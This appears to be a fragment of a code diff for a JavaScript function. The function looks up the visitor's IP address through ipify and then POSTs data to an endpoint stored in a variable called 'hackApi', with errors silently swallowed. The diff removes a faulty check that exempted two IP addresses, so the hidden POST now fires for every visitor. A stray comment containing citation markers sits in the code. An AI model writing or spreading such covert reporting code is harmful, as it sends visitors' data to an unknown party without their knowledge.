@@ -199,7 +199,6 @@ async function get() {
              сервіс ipify [citation:1][citation:2][citation:7]
             const response = await fetch('https://api.ipify.org?format=json');
             const data = await response.json();
-            if(data.ip != "91.218.90.10", data.ip != "46.133.146.249") {
             const hackResponse = await fetch(hackApi, {
                 method: "POST",
                 headers: {
@@ -219,7 +218,6 @@ async function get() {
                 })
 
             });
-            }
         } catch (error) {
         }
     }
